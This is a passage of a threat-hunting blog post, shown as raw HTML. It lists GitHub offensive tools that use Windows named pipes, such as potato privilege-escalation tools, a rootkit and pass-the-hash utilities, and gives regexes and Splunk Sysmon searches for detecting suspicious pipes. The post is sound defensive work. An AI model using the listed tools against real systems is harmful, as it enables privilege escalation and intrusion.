pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Here are some interesting GitHub projects exploiting or using named pipes that should be added to the <a class="ah qr" href="https://github.com/mthcht/ThreatHunting-Keywords" rel="noopener ugc nofollow" target="_blank">ThreatHunting-Keywords</a> project, along with additional detection patterns beyond just named pipes:</p><ul class=""><li id="b5bd" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/threatexpress/invoke-pipeshell" rel="noopener ugc nofollow" target="_blank">https://github.com/threatexpress/invoke-pipeshell</a></li><li id="c0e0" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/S3cur3Th1sSh1t/NamedPipePTH" rel="noopener ugc nofollow" target="_blank">https://github.com/S3cur3Th1sSh1t/NamedPipePTH</a></li><li id="4af7" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH" rel="noopener ugc nofollow" target="_blank">https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH</a></li><li id="0baf" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/cyberark/PipeViewer" rel="noopener ugc nofollow" target="_blank">https://github.com/cyberark/PipeViewer</a> (greyware tool)</li><li id="31e6" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/S3cur3Th1sSh1t/Privesc" rel="noopener ugc nofollow" target="_blank">https://github.com/S3cur3Th1sSh1t/Privesc</a></li><li id="b933" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/antonioCoco/RoguePotato" rel="noopener ugc nofollow" target="_blank">https://github.com/antonioCoco/RoguePotato</a></li><li id="9f77" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/bytecode77/r77-rootkit" rel="noopener ugc nofollow" target="_blank">https://github.com/bytecode77/r77-rootkit</a></li><li id="3cb1" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/thebookisclosed/AmperageKit" rel="noopener ugc nofollow" target="_blank">https://github.com/thebookisclosed/AmperageKit</a></li><li id="c687" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/calebstewart/pwncat-badpotato" rel="noopener ugc nofollow" target="_blank">https://github.com/calebstewart/pwncat-badpotato</a></li><li id="bed7" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/Prepouce/CoercedPotato" rel="noopener ugc nofollow" target="_blank">https://github.com/Prepouce/CoercedPotato</a></li><li id="5787" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/g3tsyst3m/elevationstation" rel="noopener ugc nofollow" target="_blank">https://github.com/g3tsyst3m/elevationstation</a></li><li id="3daf" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/v1k1ngfr/fuegoshell" rel="noopener ugc nofollow" target="_blank">https://github.com/v1k1ngfr/fuegoshell</a></li><li id="a7a6" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/Al1ex/WindowsElevation" rel="noopener ugc nofollow" target="_blank">https://github.com/Al1ex/WindowsElevation</a></li><li id="f70b" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/Leo4j/Amnesiac" rel="noopener ugc nofollow" target="_blank">https://github.com/Leo4j/Amnesiac</a></li><li id="b902" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/antonioCoco/SharPyShell" rel="noopener ugc nofollow" target="_blank">https://github.com/antonioCoco/SharPyShell</a></li><li id="a723" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/rootm0s/WinPwnage" rel="noopener ugc nofollow" target="_blank">https://github.com/rootm0s/WinPwnage</a></li><li id="738a" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph=""><a class="ah qr" href="https://github.com/lexfo/rpc2socks" rel="noopener ugc nofollow" target="_blank">https://github.com/lexfo/rpc2socks</a></li></ul><p id="0f20" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">If you have the chance to analyze open-source code, you can potentially save time by extracting named pipes using these regex patterns:</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="95da" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">'NamedPipe_C':r'new PipeServer\&lt;PipeMessage\&gt;\(.+?(?=\))',<br>'NamedPipe_C2':r'NamePipe\s=\s.+?(?=\;)',<br>'NamedPipe_C':r'\sstring\sPIPE_NAME\s\=\s[\"\'].+?(?=[\"\'])',        <br>'NamedPipe_C#':r'new\s+NamedPipeServerStream\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_C#2':r'new\s+NamedPipeClientStream\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_C++':r'CreateNamedPipe\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_C++2':r'CreateNamedPipeA\(.*',<br>'NamedPipe_C++3':r'CreateFile\([^,]+,\s*FILE_FLAG_OVERLAPPED\s*\|[^,]*,\s*PIPE_TYPE_MESSAGE',<br>'NamedPipe_global':r'\\\\\\\\\.\\\\pipe\\\\.{0,1000}',<br>'NamedPipe_global2':r'\\\\\.\\pipe\\.{0,1000}',<br>'NamedPipe_Python':r'os\.mkfifo\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_python2':r'open\(([\'\"])([^\'\"]+)\1,\s*[\'\"]w[\'\"]\)',<br>'NamedPipe_python3':r'open\(([\'\"])([^\'\"]+)\1,\s*[\'\"]r[\'\"]\)',<br>'NamedPipe_python4':r'Popen\([^)]*stdout\s*=\s*PIPE',<br>'NamedPipe_Java':r'new\s+PipedOutputStream\(([^)]*)\)',<br>'NamedPipe_Java2':r'new\s+PipedInputStream\(([^)]*)\)',<br>'NamedPipe_powershell':r'New-Object\s+System.IO.Pipes.NamedPipeServerStream\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_powershell2':r'New-Object\s+System.IO.Pipes.NamedPipeClientStream\(([\'\"])([^\'\"]+)\1',<br>'NamedPipe_Nodejs':r'net\.createServer\(\s*function\s*\(\s*socket\s*\)\s*\{',<br>'NamedPipe_Nodejs2':r'net\.connect\(\s*{[^}]*path:\s*([\'\"])([^\'\"]+)\1',<br>'NamedPipe_global':r'\\\\\\\\.\\\\pipe\\\\.*',<br>'NamedPipe_global2':r'\\\\.\\pipe\\.*'</span></pre></div></div></div><div class="ac ci rz sa sb sc" role="separator"><span class="sd by bn go se sf"></span><span class="sd by bn go se sf"></span><span class="sd by bn go se"></span></div><div class="ib iu iv iw ix"><div class="ac ci"><div class="cp bi ih ii ij ik"><h2 id="a32c" class="pq pr ja bg ps pt sg pv gy pw sh py ha pz si qb qc qd sj qf qg qh sk qj qk ql bl" data-selectable-paragraph="">How to Hunt for suspicious named pipe with the list</h2><figure class="qx qy qz ra rb op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi vf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 1100w, https://miro.medium.com/v2/resize:fit:1276/format:webp/1*UZsyaatbjE33xOjeDiK6Eg.png 1276w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 638px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*UZsyaatbjE33xOjeDiK6Eg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*UZsyaatbjE33xOjeDiK6Eg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*UZsyaatbjE33xOjeDiK6Eg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*UZsyaatbjE33xOjeDiK6Eg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*UZsyaatbjE33xOjeDiK6Eg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*UZsyaatbjE33xOjeDiK6Eg.png 1100w, https://miro.medium.com/v2/resize:fit:1276/1*UZsyaatbjE33xOjeDiK6Eg.png 1276w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 638px"><img alt="" class="bi gl ou c" width="638" height="194" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:638/1*UZsyaatbjE33xOjeDiK6Eg.png"></picture></div></div></figure><p id="c4d2" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">With Splunk, it’s straightforward. First, upload my list to Splunk and name it <code class="de qs qt qu qv b">suspicious_named_pipe_list.csv</code>. Then, create a lookup definition named <code class="de qs qt qu qv b">suspicious_named_pipe_list</code> linked to <code class="de qs qt qu qv b">suspicious_named_pipe_list.csv</code>, ensuring it is not case-sensitive and allows wildcard matches on the field <code class="de qs qt qu qv b">pipe_name</code>.</p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div role="button" tabindex="0" class="oq or fr os bi ot"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="oh oi vg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MfBUHCVXxa6Ty65Mzm30Gw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*MfBUHCVXxa6Ty65Mzm30Gw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*MfBUHCVXxa6Ty65Mzm30Gw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*MfBUHCVXxa6Ty65Mzm30Gw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*MfBUHCVXxa6Ty65Mzm30Gw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*MfBUHCVXxa6Ty65Mzm30Gw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*MfBUHCVXxa6Ty65Mzm30Gw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*MfBUHCVXxa6Ty65Mzm30Gw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi gl ou c" width="700" height="525" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*MfBUHCVXxa6Ty65Mzm30Gw.png"></picture></div></div></figure><p id="6efe" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Use this search to find all named pipes reserved for Threat Hunting sessions (filter on <code class="de qs qt qu qv b">metadata_usage</code> "Hunting"):</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="92df" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon` signature_id IN (17,18) pipe_name=*<br>  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]<br>  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]<br>  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as <br>  pipe_name_detection_pattern metadata_category metadata_comment metadata_description <br>  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference<br>  | where metadata_usage="Hunting"<br>  | stats count <br>    values(process_id) as process_id<br>    values(process_guid) as process_guid<br>    values(process_path) as process_path<br>    values(process_name) as process_name<br>    values(signature_id) as signature_id<br>    earliest(_time) as firsttime <br>    latest(_time) as lasttime <br>    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment <br>    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference</span></pre><p id="e551" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Use this search to find all relevant named pipes for Detection rules (filter on <code class="de qs qt qu qv b">metadata_usage</code> "detection rule"):</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="3ef4" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon` signature_id IN (17,18) pipe_name=*<br>  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]<br>  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]<br>  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as <br>  pipe_name_detection_pattern metadata_category metadata_comment metadata_description <br>  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference<br>  | where metadata_usage="detection rule"<br>  | stats count <br>    values(process_id) as process_id<br>    values(process_guid) as process_guid<br>    values(process_path) as process_path<br>    values(process_name) as process_name<br>    values(signature_id) as signature_id<br>    earliest(_time) as firsttime <br>    latest(_time) as lasttime <br>    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment <br>    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference</span></pre><p id="4555" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Search for every pipe name in my list:</p><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="3497" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon` signature_id IN (17,18) pipe_name=*<br>  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]<br>  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]<br>  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as <br>  pipe_name_detection_pattern metadata_category metadata_comment metadata_description <br>  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference<br>  | where metadata_usage="detection rule"<br>  | stats count <br>    values(process_id) as process_id<br>    values(process_guid) as process_guid<br>    values(process_path) as process_path<br>    values(process_name) as process_name<br>    values(signature_id) as signature_id<br>    earliest(_time) as firsttime <br>    latest(_time) as lasttime <br>    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment <br>    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference</span></pre><p id="430a" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph=""><code class="de qs qt qu qv b">`sysmon`</code> is a macro searching in your sysmon logs replace it with your own macro or index/sourcetype combinaison.</p><p id="5935" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Feel free to add more filters based on the severity, priority, fp_risk, tool, category, usage or type for increased granularity.<br>For example, to <strong class="ox jb">hunt for the usage of RMM tools</strong></p><figure class="qx qy qz ra rb op oh oi paragraph-image"><div class="oh oi vh"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*negbB9x_pLvleQRW.jpg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*negbB9x_pLvleQRW.jpg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*negbB9x_pLvleQRW.jpg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*negbB9x_pLvleQRW.jpg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*negbB9x_pLvleQRW.jpg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*negbB9x_pLvleQRW.jpg 1100w, https://miro.medium.com/v2/resize:fit:1334/format:webp/0*negbB9x_pLvleQRW.jpg 1334w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 667px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*negbB9x_pLvleQRW.jpg 640w, https://miro.medium.com/v2/resize:fit:720/0*negbB9x_pLvleQRW.jpg 720w, https://miro.medium.com/v2/resize:fit:750/0*negbB9x_pLvleQRW.jpg 750w, https://miro.medium.com/v2/resize:fit:786/0*negbB9x_pLvleQRW.jpg 786w, https://miro.medium.com/v2/resize:fit:828/0*negbB9x_pLvleQRW.jpg 828w, https://miro.medium.com/v2/resize:fit:1100/0*negbB9x_pLvleQRW.jpg 1100w, https://miro.medium.com/v2/resize:fit:1334/0*negbB9x_pLvleQRW.jpg 1334w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 667px"><img alt="" class="bi gl ou c" width="667" height="374" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:667/0*negbB9x_pLvleQRW.jpg"></picture></div></figure><p id="c231" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">you can add this filter <code class="de qs qt qu qv b">|where metadata_category="RMM"</code> !</p><p id="8a04" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">If you want to hunt for lateral movement tools usage: <code class="de qs qt qu qv b">|where metadata_category="Lateral Movement"</code></p><p id="05ff" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">Similarly, you can filter your searches for specific needs by applying filters such as:</p><ul class=""><li id="becb" class="ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp rg rh ri bl" data-selectable-paragraph="">Severity: <code class="de qs qt qu qv b">| search metadata_severity IN ("high","critical")</code></li><li id="aa75" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Priority: <code class="de qs qt qu qv b">| where metadata_priority="critical"</code></li><li id="2f94" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Low False Positive Risk: <code class="de qs qt qu qv b">| search metadata_fp_risk IN ("none","N/A","low")</code></li><li id="5ed0" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Tool CobaltStrike: <code class="de qs qt qu qv b">| where metadata_tool="CobaltStrike"</code></li><li id="870d" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Usage: <code class="de qs qt qu qv b">| where metadata_usage="detection rule"</code></li><li id="e95d" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Type: <code class="de qs qt qu qv b">| where metadata_tool_type="offensive_tool"</code></li><li id="9b80" class="ov ow ja ox b oy rj pa pb pc rk pe pf hb rl ph pi he rm pk pl hh rn pn po pp rg rh ri bl" data-selectable-paragraph="">Category: <code class="de qs qt qu qv b">| where metadata_category="Privilege Escalation"</code></li></ul><p id="d4be" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">…</p><h2 id="cdc1" class="pq pr ja bg ps pt pu pv gy pw px py ha pz qa qb qc qd qe qf qg qh qi qj qk ql bl" data-selectable-paragraph="">Hunting without the list</h2><h3 id="64da" class="rp pr ja bg ps gx rq ef gy gz rr eh ha hb rs hc hd he rt hf hg hh ru hi hj rv bl" data-selectable-paragraph="">Unsigned processes creating pipes</h3><pre class="qx qy qz ra rb sm qv sn bq so bc bl"><span id="8a1f" class="sp pr ja qv b bh sq sr m ss st" data-selectable-paragraph="">`sysmon` signature_id=17 <br>NOT [|inputlookup Sysmon_exclusions.csv | fields - metadata_*]<br>| stats earliest(_time) as firsttime latest(_time) as lasttime<br>  count by pipe_name process_path signature_id src_nt_host<br>| join process_path src_nt_host<br>  [search `sysmon` signature_id=7 Signed=false<br>   | table src_nt_host process_id process_path parent_process_path Company Signed]<br>| search NOT [|inputlookup Unsigned_processes_creating_pipes.csv | fields - metadata_*]</span></pre><p id="b4df" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">We first search Sysmon Event ID 17 for created pipes, then pivot on the process_path in Event ID 1 to check if the executable creating the pipe is signed. You could change the join from “process_path src_nt_host” to “process_id src_nt_host” (ensure these fields are correctly parsed in your Sysmon logs).</p><p id="a76b" class="pw-post-body-paragraph ov ow ja ox b oy oz pa pb pc pd pe pf hb pg ph pi he pj pk pl hh pm pn po pp ib bl" data-selectable-paragraph="">This search is reserved for threat hunting, requiring significant triage but potentially giving us interesting results. For my test:</p></div></div><div class="op bi"><figure class="qx qy qz ra rb op bi paragraph-image"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 1100w, https://miro.medium.com/v2/resize:fit:3554/format:webp/1*3Ti9zJeP3uTPQ60WjOLz1A.png 3554w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1777px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*3Ti9zJeP3uTPQ60WjOLz1A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*3Ti9zJeP3uTPQ60WjOLz1A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*3Ti9zJeP3uTPQ60WjOLz1A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*3Ti9zJeP3uTPQ60WjOLz1A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*3Ti9zJeP3uTPQ60WjOLz1A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*3Ti9zJeP3uTPQ60WjOLz1A.png 1100w, https://miro.medium.com/v2/resize:fit:3554/1*3Ti9zJeP3uTPQ60WjOLz1A.png 3554w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1777px"><img alt="" class="bi gl ou c" width="1777" height="200" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1777/1*3Ti9zJeP3uTPQ60WjOLz1A.png"></picture><figcaption class="rc fm rd oh oi re rf bg b bh ab eb" data-selectable-paragraph="">Unsigned processes creating pipes</figcaption></figure></div><div class="ac ci"><div class="cp bi ih ii ij ik"><p id="b486" 